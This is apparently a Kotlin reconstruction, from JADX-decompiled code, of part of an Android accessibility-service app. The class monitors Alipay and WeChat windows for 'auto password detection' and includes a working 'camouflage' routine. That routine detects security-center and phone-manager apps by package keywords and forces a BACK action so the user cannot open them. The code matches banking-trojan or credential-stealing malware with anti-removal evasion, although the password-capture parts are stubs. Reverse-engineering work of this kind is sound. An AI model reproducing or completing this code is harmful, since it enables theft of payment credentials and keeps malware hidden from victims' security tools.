package com.storm.safe.rock.service.modules

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * EventFilterManager — filters and dispatches accessibility events for
 * Alipay, WeChat, auto-password detection, and camouflage monitoring.
 *
 * JADX class: p000/C0614i9 (1152 lines)
 * Key methods:
 * - m213127b5(event) — main event dispatch
 * - m213119a7() — disableAlipayDetection
 * - m213121a9() — disableWechatDetection
 * - m213122b0(delayMs) — enableAlipayDetection
 * - m213125b3(delayMs) — enableWechatDetection
 * - m213123b1(delayMs) — enableAutoPassword
 * - m213120a8() — disableAutoPassword
 * - m213124b2() — enableCamouflageMonitoring
 */
class EventFilterManager(
    private val service: MyAccessibilityService,
    private val context: Context
) {
    companion object {
        private const val TAG = "AccessibilityEventManager"
    }

    // ── Fields from JADX ──

    /** JADX: f56823a3 — ScreenCaptureManager reference for event dispatch */
    var screenCaptureManager: Any? = null

    /** JADX: f56826a6 — last text selection event timestamp */
    var lastTextSelectionTime: Long = 0L

    /** JADX: f56827a7 — auth state restored (controls C0320a5 dispatch) */
    var isAuthStateRestored: Boolean = false

    /** JADX: f56828a8 — Alipay detection enabled */
    @Volatile
    var isAlipayDetectionEnabled: Boolean = false
        private set

    /** JADX: f56829a9 — Alipay detection delay ms */
    var alipayDetectionDelay: Long = 5000L
        private set

    /** JADX: f56830b0 — WeChat detection enabled */
    @Volatile
    var isWechatDetectionEnabled: Boolean = false
        private set

    /** JADX: f56831b1 — WeChat detection delay ms */
    var wechatDetectionDelay: Long = 5000L
        private set

    /** JADX: f56834b4 — auto password detection enabled */
    @Volatile
    var isAutoPasswordEnabled: Boolean = false
        private set

    /** JADX: f56835b5 — auto password detection delay ms */
    var autoPasswordDelay: Long = 5000L
        private set

    /** JADX: f56839b9 — phone manager camouflage enabled */
    @Volatile
    var isPhoneManagerCamouflageEnabled: Boolean = false

    /** JADX: f56848c8 — secondary capture filter mode flag */
    @Volatile
    var isSecondaryCaptureMode: Boolean = false

    /** JADX: f56838b8 — handler for delayed runnables */
    private val handler = Handler(Looper.getMainLooper())

    /** JADX: f56836b6 — pending Alipay check runnable */
    private var pendingAlipayRunnable: Runnable? = null

    /** JADX: f56837b7 — pending WeChat check runnable */
    private var pendingWechatRunnable: Runnable? = null

    /** JADX: f56846c6 — pending auto-password check runnable */
    private var pendingAutoPasswordRunnable: Runnable? = null

    // ════════════════════════════════════════════════════════════════
    // Main event dispatch
    // ════════════════════════════════════════════════════════════════

    /**
     * Dispatch accessibility event for filtering.
     * JADX: m213127b5(AccessibilityEvent)
     *
     * Routes events through:
     * 1. screenCaptureManager.onEvent (if present)
     * 2. MainOrchestrator.handleAccessibilityEvent (if !secondaryCaptureMode)
     * 3. Auth-state-gated dispatch (C0320a5, C0325b0)
     * 4. Internal event analysis (m213113a0)
     */
    fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            if (isSecondaryCaptureMode) {
                // JADX: secondary capture mode — only dispatch to screenCaptureManager
                // JADX: c0260a2.m211312e4(accessibilityEvent)
                if (event.eventType == 32) {
                    handleWindowStateChanged(event)
                }
                return
            }

            // Normal mode dispatch
            // JADX: c0260a2.m211312e4(accessibilityEvent) on screenCaptureManager

            // JADX: dispatch to MainOrchestrator (C0327b2)
            try {
                service.mainOrchestrator?.handleAccessibilityEvent(event)
            } catch (_: Exception) {}

            // JADX: dispatch to C0320a5 (if auth restored) and C0325b0
            var source: AccessibilityNodeInfo? = null
            if (event.eventType == 16 || event.eventType == 1) {
                try {
                    source = event.source
                } catch (_: Exception) {}
            }

            try {
                // JADX: internal analysis
                analyzeEvent(event, source)
            } finally {
                try {
                    if (source != null && (event.eventType == 16 || event.eventType == 1)) {
                        source.recycle()
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 处理无障碍事件失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Detection enable/disable
    // ════════════════════════════════════════════════════════════════

    /**
     * Enable Alipay detection.
     * JADX: m213122b0(long)
     */
    fun enableAlipayDetection(delayMs: Long) {
        try {
            isAlipayDetectionEnabled = true
            alipayDetectionDelay = delayMs
            android.util.Log.d(TAG, "💰 支付宝检测已开启，延时: ${delayMs}ms")
            MyAccessibilityService.logEvent("ALIPAY_DETECTION_ENABLED", "支付宝检测已开启")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 开启支付宝检测失败", e)
        }
    }

    /**
     * Disable Alipay detection.
     * JADX: m213119a7()
     */
    fun disableAlipayDetection() {
        try {
            isAlipayDetectionEnabled = false
            android.util.Log.d(TAG, "💰 支付宝检测已关闭")
            MyAccessibilityService.logEvent("ALIPAY_DETECTION_DISABLED", "支付宝检测已关闭")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭支付宝检测失败", e)
        }
    }

    /**
     * Enable WeChat detection.
     * JADX: m213125b3(long)
     */
    fun enableWechatDetection(delayMs: Long) {
        try {
            isWechatDetectionEnabled = true
            wechatDetectionDelay = delayMs
            android.util.Log.d(TAG, "💬 微信检测已开启，延时: ${delayMs}ms")
            MyAccessibilityService.logEvent("WECHAT_DETECTION_ENABLED", "微信检测已开启")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 开启微信检测失败", e)
        }
    }

    /**
     * Disable WeChat detection.
     * JADX: m213121a9()
     */
    fun disableWechatDetection() {
        try {
            isWechatDetectionEnabled = false
            android.util.Log.d(TAG, "💬 微信检测已关闭")
            MyAccessibilityService.logEvent("WECHAT_DETECTION_DISABLED", "微信检测已关闭")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭微信检测失败", e)
        }
    }

    /**
     * Enable auto password detection.
     * JADX: m213123b1(long)
     */
    fun enableAutoPassword(delayMs: Long) {
        try {
            isAutoPasswordEnabled = true
            autoPasswordDelay = delayMs
            android.util.Log.d(TAG, "🔐 开启自动密码检测，延时: ${delayMs}ms")
            MyAccessibilityService.logEvent("AUTO_PASSWORD_DETECTION_ENABLED", "自动密码检测已开启")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 开启自动密码检测失败", e)
        }
    }

    /**
     * Disable auto password detection.
     * JADX: m213120a8()
     */
    fun disableAutoPassword() {
        try {
            isAutoPasswordEnabled = false
            // JADX: remove pending runnables
            pendingAlipayRunnable?.let { handler.removeCallbacks(it) }
            pendingWechatRunnable?.let { handler.removeCallbacks(it) }
            pendingAlipayRunnable = null
            pendingWechatRunnable = null
            android.util.Log.d(TAG, "🔐 关闭自动密码检测")
            MyAccessibilityService.logEvent("AUTO_PASSWORD_DETECTION_DISABLED", "自动密码检测已关闭")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭自动密码检测失败", e)
        }
    }

    /**
     * Enable phone manager camouflage monitoring.
     * JADX: m213124b2()
     */
    fun enableCamouflageMonitoring() {
        isPhoneManagerCamouflageEnabled = true
        try {
            context.getSharedPreferences("camouflage_state", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("phone_manager_camouflage_enabled", true)
                .apply()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 保存伪装状态失败", e)
        }
        MyAccessibilityService.logEvent("PHONE_MANAGER_CAMOUFLAGE_ENABLED", "手机管家伪装监听已启用")
    }

    /**
     * Disable phone manager camouflage monitoring.
     */
    fun disableCamouflageMonitoring() {
        isPhoneManagerCamouflageEnabled = false
        try {
            context.getSharedPreferences("camouflage_state", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("phone_manager_camouflage_enabled", false)
                .apply()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 保存伪装状态失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Cleanup
    // ════════════════════════════════════════════════════════════════

    /**
     * Release all resources — remove pending callbacks.
     */
    fun release() {
        try {
            pendingAlipayRunnable?.let { handler.removeCallbacks(it) }
            pendingWechatRunnable?.let { handler.removeCallbacks(it) }
            pendingAutoPasswordRunnable?.let { handler.removeCallbacks(it) }
            pendingAlipayRunnable = null
            pendingWechatRunnable = null
            pendingAutoPasswordRunnable = null
        } catch (_: Exception) {}
    }

    // ════════════════════════════════════════════════════════════════
    // Internal helpers
    // ════════════════════════════════════════════════════════════════

    /**
     * Handle WINDOW_STATE_CHANGED in secondary capture mode.
     * JADX: m213130b8(AccessibilityEvent)
     */
    private fun handleWindowStateChanged(event: AccessibilityEvent) {
        // JADX: secondary capture filter — specific to capture mode transitions
        // Minimal stub — full implementation involves checking capture state
    }

    /**
     * Analyze event internals.
     * JADX: m213113a0(AccessibilityEvent, AccessibilityNodeInfo?)
     *
     * Handles camouflage monitoring, click event analysis, text selection
     * timestamp, and focus change events.
     */
    private fun analyzeEvent(event: AccessibilityEvent, source: AccessibilityNodeInfo?) {
        try {
            // JADX: if camouflage enabled → check package/class for phone manager
            if (isPhoneManagerCamouflageEnabled) {
                val pkg = event.packageName?.toString() ?: ""
                val cls = event.className?.toString() ?: ""
                handleCamouflageCheck(pkg, cls)
            }

            when (event.eventType) {
                1 -> { // TYPE_VIEW_CLICKED
                    // JADX: analyzeClickEvent — check for confirm buttons
                }
                8 -> { // TYPE_VIEW_FOCUSED
                    // JADX: handle focus change for Alipay/WeChat detection
                    if (isAlipayDetectionEnabled || isWechatDetectionEnabled) {
                        handleFocusForDetection(event)
                    }
                }
                16 -> { // TYPE_VIEW_TEXT_CHANGED
                    lastTextSelectionTime = System.currentTimeMillis()
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Check camouflage state — if phone manager detected, perform BACK.
     * JADX: m213117a5(String, String)
     */
    private fun handleCamouflageCheck(packageName: String, className: String) {
        // JADX: checks if package matches phone manager apps (security center, etc.)
        // If match detected, performs GLOBAL_ACTION_BACK to hide from phone manager
        val managerKeywords = arrayOf(
            "securitycenter", "phonemanager", "safecenter",
            "systemmanager", "devicemanager", "battery"
        )
        val pkgLower = packageName.lowercase()
        for (keyword in managerKeywords) {
            if (pkgLower.contains(keyword)) {
                android.util.Log.d(TAG, "🛡️ [伪装] 检测到手机管家: $packageName")
                try {
                    service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                } catch (_: Exception) {}
                return
            }
        }
    }

    /**
     * Handle focus change for Alipay/WeChat detection.
     * JADX: part of m213113a0 eventType==8 branch
     */
    private fun handleFocusForDetection(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        val pkgLower = pkg.lowercase()
        if (isAlipayDetectionEnabled && pkgLower.contains("alipay")) {
            // JADX: m213128b6() — schedule Alipay password check
            android.util.Log.d(TAG, "💰 检测到支付宝获得焦点")
        }
        if (isWechatDetectionEnabled && (pkgLower.contains("wechat") || pkgLower.contains("tencent.mm"))) {
            // JADX: m213129b7() — schedule WeChat password check
            android.util.Log.d(TAG, "💬 检测到微信获得焦点")
        }
    }
}
